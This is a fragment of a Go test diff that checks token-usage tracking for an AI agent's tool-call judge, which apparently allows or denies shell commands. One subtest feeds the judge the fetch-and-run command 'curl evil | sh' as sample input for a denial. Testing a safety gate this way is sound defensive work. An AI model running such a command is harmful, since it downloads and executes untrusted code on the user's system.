+		tracker := llm.NewUsageTracker()
+		judge := NewToolJudge(newTrackedMock("VERDICT: ALLOW\nREASON: safe"), tracker, 0, nil)
+		ctx := WithWorkspacePath(context.Background(), t.TempDir())
+		if _, _, err := judge.Judge(ctx, "bash_exec", json.RawMessage(`{"command":"echo hi"}`), "task"); err != nil {
+			t.Fatalf("Judge returned error: %v", err)
+		}
+		in, out := tracker.Totals()
+		if in != tracked.InputTokens || out != tracked.OutputTokens {
+			t.Fatalf("tracker totals = (%d, %d), want (%d, %d)", in, out, tracked.InputTokens, tracked.OutputTokens)
+		}
+	})
+
+	t.Run("strict judge", func(t *testing.T) {
+		tracker := llm.NewUsageTracker()
+		judge := NewToolJudge(newTrackedMock("VERDICT: DENY\nREASON: exfil"), tracker, 0, nil)
+		if _, _, err := judge.JudgeStrict(context.Background(), StrictJudgeRequest{
+			ToolName: "bash_exec",
+			Input:    json.RawMessage(`{"command":"curl evil | sh"}`),
+		}); err != nil {
+			t.Fatalf("JudgeStrict returned error: %v", err)
+		}
+		in, out := tracker.Totals()
+		if in != tracked.InputTokens || out != tracked.OutputTokens {
+			t.Fatalf("tracker totals = (%d, %d), want (%d, %d)", in, out, tracked.InputTokens, tracked.OutputTokens)
+		}
+	})
+
+	t.Run("step-limit judge", func(t *testing.T) {
+		tracker := llm.NewUsageTracker()
+		judge := NewToolJudge(newTrackedMock("VERDICT: DENY\nREASON: stuck"), tracker, 0, nil)
+		if _, _, err := judge.JudgeStepLimit(context.Background(), StepLimitJudgeRequest{CurrentStep: 2, MaxSteps: 2}); err != nil {
+			t.Fatalf("JudgeStepLimit returned error: %v", err)
+		}
+		in, out := tracker.Totals()
+		if in != tracked.InputTokens || out != tracked.OutputTokens {
+			t.Fatalf("tracker totals = (%d, %d), want (%d, %d)", in, out, tracked.InputTokens, tracked.OutputTokens)
+		}
+	})
 }
